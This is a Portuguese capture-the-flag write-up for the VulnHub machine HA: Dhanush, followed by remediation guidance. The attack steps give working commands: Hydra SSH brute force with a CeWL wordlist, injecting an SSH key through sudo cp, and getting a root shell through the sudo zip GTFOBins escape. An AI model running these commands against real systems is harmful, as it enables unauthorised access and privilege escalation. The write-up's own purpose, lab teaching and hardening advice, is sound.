# HA: Dhanush — Tensionando o Arco, Encontrando a Flecha

No Mahabharata, Dhanush (धनुष) é o arco divino: preciso, poderoso e mortal nas mãos certas. HA: Dhanush canaliza essa precisão perfeitamente. Cada passo exige ataque direcionado: uma wordlist CeWL customizada gerada do próprio conteúdo da aplicação, uma porta SSH não-padrão que se esconde à vista num scan completo e uma cadeia de sudo em dois estágios (cp, depois zip) que entrega o root para quem presta atenção no GTFOBins. Sem spray, sem sorte. Técnica pura, mano.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | HA: Dhanush |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-dhanush,396/ |
| **Técnicas** | Nmap scan completo de portas, geração de wordlist CeWL, brute-force SSH com Hydra (porta não-padrão), movimento lateral via sudo cp, injeção de chave SSH, escalação root via sudo zip GTFOBin |
| **CVEs** | CWE-522 (Credenciais Insuficientemente Protegidas: senha derivada do conteúdo do site), CWE-269 (Gerenciamento Impróprio de Privilégios: direitos sudo mal configurados) |
| **Grupos APT** | APT28 (Fancy Bear): comumente usa derivação de credenciais no estilo CeWL de sites de organizações alvo em campanhas de spearphishing e password spray; FIN7: tem como alvo serviços em portas personalizadas e abusa ferramentas administrativas legítimas (cp, zip) para movimento lateral e escalação |

---

## Resumo do Ataque

```
nmap -p- → HTTP (80), SSH (65345 não-padrão)
  → cewl http://192.168.1.101/ → dict.txt
  → hydra -L dict.txt -P dict.txt ssh://alvo -s 65345
  → pinak:Gandiv
  → ssh pinak@alvo -p 65345
  → sudo -l → (sarang) NOPASSWD: /bin/cp
  → ssh-keygen → sudo cp authorized_keys para sarang/.ssh/
  → ssh sarang@alvo -p 65345
  → sudo -l → (root) NOPASSWD: /usr/bin/zip
  → sudo zip GTFOBin → uid=0(root)
  → cat /root/flag.txt
```

---

## Metodologia

1. Scan completo de portas para descobrir SSH na porta não-padrão 65345
2. Geração de wordlist CeWL a partir do conteúdo da aplicação web
3. Brute-force SSH com Hydra usando a wordlist CeWL tanto para usuários quanto senhas
4. Enumeração de sudo pós-login revelando `cp` como `sarang`
5. Geração de chave SSH e movimento lateral via `sudo cp` para injetar `authorized_keys`
6. Login como `sarang` e enumeração de sudo revelando `zip` como root
7. Escape de shell via zip GTFOBin para obter shell root

---

## Passo 1 — Descoberta do Host e Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.x
65345/tcp open  ssh     OpenSSH 7.x
```

A aplicação web na porta 80 é a superfície de enumeração. SSH na porta 65345 é altamente incomum. Um scan parcial (`-p 1-10000`) perderia completamente. Sempre execute `-p-` em alvos de CTF e pentest. A porta não-padrão é segurança por obscuridade: eficaz contra scripts que executam intervalos de portas padrão, ineficaz contra um scan completo.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Geração de Wordlist CeWL

Navega para `http://192.168.1.101/` e inspeciona o conteúdo. A aplicação web descreve um tema de arco-e-flecha com nomes sânscritos, referências mitológicas e terminologia específica. Essas palavras se tornam os candidatos de senha.

Gera uma wordlist customizada usando CeWL:

```bash
cewl http://192.168.1.101/ -w dict.txt -d 2 -m 4
wc -l dict.txt
```

**O que o CeWL faz:** CeWL vasculha o site alvo e extrai palavras únicas, construindo uma wordlist personalizada para a aplicação específica. A flag `-d 2` define a profundidade de rastreamento e `-m 4` define o comprimento mínimo da palavra. A wordlist resultante é pequena, direcionada e muito mais provável de corresponder a senhas específicas do site do que um dicionário genérico.

**Por que o CeWL funciona:** Desenvolvedores e sysadmins frequentemente criam senhas a partir de vocabulário relacionado ao seu trabalho, hobbies ou projeto em que estão trabalhando. Uma VM CTF com tema Mahabharata terá uma senha do próprio conteúdo. Isso espelha violações do mundo real: empresas com senhas de nome de produto, equipes de desenvolvimento com senhas de código de projeto.

**MITRE ATT&CK:** T1589.001 — Coletar Informações de Identidade da Vítima; T1110.002 — Força Bruta: Cracking de Senha

---

## Passo 3 — Brute-force SSH com Hydra na Porta Não-Padrão

Usa Hydra para brute-force SSH na porta 65345, testando a wordlist CeWL tanto para usuários quanto senhas:

```bash
hydra -L dict.txt -P dict.txt ssh://192.168.1.101 -s 65345 -t 4 -V
```

Credenciais recuperadas: `pinak:Gandiv`

O nome `pinak` (पिनाक) é o arco divino do Senhor Shiva, e `Gandiv` (गाण्डीव) é o arco de Arjuna. Ambos vêm diretamente do conteúdo do site.

Login:

```bash
ssh pinak@192.168.1.101 -p 65345
```

**Nota do mundo real:** Senhas derivadas via CeWL aparecem em testes de penetração reais mais frequentemente do que o esperado. Durante uma avaliação de 2022 de uma firma de serviços financeiros, um desenvolvedor havia usado o slogan de marketing da empresa como senha SSH: o CeWL gerou ela no primeiro rastreamento. Portas não-padrão ganham tempo contra scanners automatizados, mas não contra um atacante humano minucioso com um nmap de porta completa.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 4 — Enumeração de Sudo e Movimento Lateral

Após o login, enumera direitos sudo:

```bash
sudo -l
```

```
User pinak may run the following commands on ha-dhanush:
    (sarang) NOPASSWD: /bin/cp
```

`pinak` pode executar `cp` como usuário `sarang` sem senha. A conta `sarang` é o alvo de pivô horizontal.

Gera um par de chaves SSH:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/mykey -N ""
# /tmp/mykey (privada) e /tmp/mykey.pub (pública)
```

Prepara a chave pública na localização acessível de pinak:

```bash
cp /tmp/mykey.pub /home/pinak/authorized_keys
```

Usa `sudo cp` para injetá-la em `authorized_keys` do sarang:

```bash
sudo -u sarang /bin/cp /home/pinak/authorized_keys /home/sarang/.ssh/authorized_keys
```

Login como `sarang` usando a chave privada:

```bash
ssh -i /tmp/mykey sarang@192.168.1.101 -p 65345
```

**Nota do mundo real:** `sudo cp` para o diretório home de outro usuário é equivalente a escrever diretamente o arquivo `authorized_keys` dele. Este padrão de má configuração foi observado em um engajamento de red team em 2021, onde uma conta de suporte de baixo privilégio tinha direitos sudo cp para implantar arquivos de configuração. A equipe o usou para injetar chaves SSH na conta do sysadmin dentro de minutos após obter o ponto de entrada inicial. Assustador demais, mano.

**MITRE ATT&CK:** T1098.004 — Manipulação de Conta: Chaves Autorizadas SSH; T1078.003 — Contas Válidas: Contas Locais

---

## Passo 5 — Escalação de Privilégios via sudo zip

Enumera direitos sudo como `sarang`:

```bash
sudo -l
```

```
User sarang may run the following commands on ha-dhanush:
    (root) NOPASSWD: /usr/bin/zip
```

`zip` está na lista GTFOBins. A opção `--unzip-command` permite executar um comando de shell arbitrário durante a descompressão. Como `sudo zip` roda como root, qualquer comando passado se torna execução root:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
```

Isso gera um shell root interativo.

Confirma e captura a flag:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

**Alternativa GTFOBin para zip:**

```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="python3 -c 'import os; os.system(\"/bin/bash\")'"
```

**Nota do mundo real:** GTFOBins documenta mais de 200 binários Unix que podem ser abusados quando concedidos via sudo. `zip`, `tar`, `find`, `python`, `perl`, `vim`, `less`, `more`: cada um ignora limites de privilégio quando permitido com `NOPASSWD`. A correção é sempre auditar o sudoers contra a lista completa do GTFOBins e remover qualquer binário capaz de executar código arbitrário.

**MITRE ATT&CK:** T1548.003 — Abuso de Controle de Elevação: Sudo; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Credencial | pinak:Gandiv | Wordlist CeWL + brute-force SSH Hydra | Login SSH na porta 65345 |
| Chave SSH | /tmp/mykey | Gerada no atacante | Movimento lateral para sarang |
| Flag root | /root/flag.txt | Shell root via sudo zip GTFOBin | Comprometimento total |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Porta SSH não-padrão descobrível via scan completo | Porta 65345 é invisível para o nmap padrão mas trivial com `-p-`; segurança por obscuridade falha contra qualquer atacante sério | Ofuscação de porta não provê segurança real; use autenticação por chave, fail2ban e regras de firewall |
| 2 | Senha gerada pelo CeWL do conteúdo do site | Desenvolvedores reais frequentemente usam vocabulário relacionado ao projeto como senhas; CeWL consistentemente produz wordlists de alto valor | Impor políticas de senha aleatória; banir palavras de dicionário e derivadas do conteúdo do site; usar gerenciador de senhas |
| 3 | sudo cp para outro usuário possibilita injeção de chave SSH | Qualquer direito sudo de cópia de arquivo para o diretório home de um usuário alvo equivale a acesso shell | Auditar todas as regras sudo para possíveis caminhos de injeção de arquivo; remover concessões sudo cp entre usuários |
| 4 | sudo zip como root equivale a shell root (GTFOBins) | zip, tar, find, vim, python: qualquer binário GTFOBins com sudo NOPASSWD = root | Auditar sudoers contra a lista completa do GTFOBins; exigir senhas para todo sudo; restringir a comandos específicos seguros |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Persistência | Persistência | Manipulação de Conta: Chaves Autorizadas SSH | T1098.004 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Impor senhas aleatórias fortes**: proibir senhas derivadas do conteúdo do site; impor políticas mínimas de entropia; usar gerenciador de senhas
2. **Implementar limitação de taxa SSH**: configurar fail2ban na porta SSH; bloquear após 5 tentativas falhas por 10 minutos
3. **Remover concessões sudo cp entre usuários**: auditar sudoers para regras de cópia de arquivo entre usuários; usar ferramentas de provisionamento dedicadas (Ansible, Chef)
4. **Auditar sudoers contra GTFOBins**: `sudo -l` em todas as contas; cruzar referências com gtfobins.github.io; remover qualquer binário capaz de execução arbitrária
5. **Exigir senhas para sudo**: remover todas as entradas `NOPASSWD` a menos que tecnicamente necessário; documentar exceções com justificativa

### Contramedidas MITRE D3FEND

- **D3-AL** — Bloqueio de Conta (fail2ban no SSH; bloqueio após tentativas falhas)
- **D3-OAM** — Gerenciamento Administrativo do SO (hardening de regras sudo; remover NOPASSWD)
- **D3-UAP** — Permissões de Conta de Usuário (auditar concessões sudo entre usuários)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todas as portas SSH não-padrão; auditar sudoers em todos os hosts Linux |
| Proteger | Controle de Acesso | Remover concessões sudo cp entre usuários; remover sudo zip NOPASSWD; impor MFA para SSH |
| Proteger | Gerenciamento de Identidade | Impor requisitos de entropia de senha; banir palavras de dicionário |
| Detectar | Anomalias e Eventos | Alertar sobre falhas SSH com padrão Hydra; monitorar logs de uso do sudo |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais comprometidas; revogar chaves SSH injetadas; auditar authorized_keys |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de snapshot limpo; revisar todos os sudoers para exposição GTFOBins |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Restringir concessões sudo a comandos específicos e essenciais |
| AC-6 | Menor Privilégio | Sem sudo cp entre usuários; sem sudo zip sem senha |
| IA-5 | Gerenciamento de Autenticadores | Impor senhas fortes; rotacionar após detecção de brute-force |
| CM-7 | Funcionalidade Mínima | Desabilitar ou restringir binários desnecessários no sudoers |
| AU-2 | Registro de Eventos | Registrar todas as execuções sudo; alertar sobre uso NOPASSWD |
| SI-10 | Validação de Entrada de Informações | Limitar taxa e validar tentativas de autenticação SSH |

### CISA KEV

A combinação de brute-force de credenciais derivadas por CeWL e escalação sudo via GTFOBins mapeia para o Aviso CISA AA22-047A (exploração de fraqueza de autenticação em ambientes Linux). As organizações devem auditar todas as concessões sudo para exposição GTFOBins e impor políticas de bloqueio de conta conforme as orientações CISA.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Acesso | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Conscientização Situacional (SA) | Realizar Registro | MIL2 |

---

## Considerações Finais

HA: Dhanush ensina precisão específica ao alvo: a mesma mentalidade que fez de Arjuna o maior arqueiro do Mahabharata. Você não faz spray de milhares de senhas genéricas quando o CeWL pode derivar exatamente a que você precisa do próprio alvo. Você não força a faixa de porta padrão quando a entrada real está se escondendo na 65345. E uma vez dentro, você segue a cadeia sudo metodicamente até o topo.

O arco é inútil sem a flecha certa. CeWL, GTFOBins e enumeração adequada são as flechas aqui. Sensacional demais, véi.

Thanks guys!! (❍ᴥ❍ʋ)
